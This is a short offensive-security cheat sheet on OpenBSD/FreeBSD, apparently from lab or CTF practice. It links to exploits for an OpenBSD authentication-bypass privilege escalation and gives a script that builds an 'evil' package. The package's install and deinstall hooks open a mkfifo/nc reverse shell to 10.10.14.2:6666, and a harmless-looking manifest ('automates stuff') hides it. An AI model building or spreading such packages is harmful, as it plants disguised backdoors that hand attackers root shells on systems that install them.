# OpenBSD-Things
#lpe #openbsd

## LPE
Name | URLs
--- | ---
Auth-Bypass (-schallenge) exploits | https://packetstormsecurity.com/files/155572/Qualys-Security-Advisory-OpenBSD-Authentication-Bypass-Privilege-Escalation.html
 -""- | https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot
 
 ## Evil PKG
 http://lastsummer.de/creating-custom-packages-on-freebsd/
 
 ```
 #!/bin/sh

STAGEDIR=.
rm -rf ${STAGEDIR}
mkdir -p ${STAGEDIR}

cat >> ${STAGEDIR}/+PRE\_DEINSTALL <<EOF
# careful here, this may clobber your system
echo "Resetting root shell"
rm /tmp/a;mkfifo /tmp/a;cat /tmp/a|/bin/sh -i 2>&1|nc 10.10.14.2 6666 >/tmp/a
EOF

cat >> ${STAGEDIR}/+POST\_INSTALL <<EOF
# careful here, this may clobber your system
echo "Registering root shell"
rm /tmp/a;mkfifo /tmp/a;cat /tmp/a|/bin/sh -i 2>&1|nc 10.10.14.2 6666 >/tmp/a
EOF

cat >> ${STAGEDIR}/+MANIFEST <<EOF
name: mypackage
version: "1.0\_5"
origin: sysutils/mypackage
comment: "automates stuff"
desc: "automates tasks which can also be undone later"
maintainer: john@doe.it
www: https://doe.it
prefix: /
EOF

mkdir -p ${STAGEDIR}/usr/local/etc
echo "# hello world" > ${STAGEDIR}/usr/local/etc/my.conf
echo "/usr/local/etc/my.conf" > ${STAGEDIR}/plist
```

`pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -p ${STAGEDIR}/plist -o .`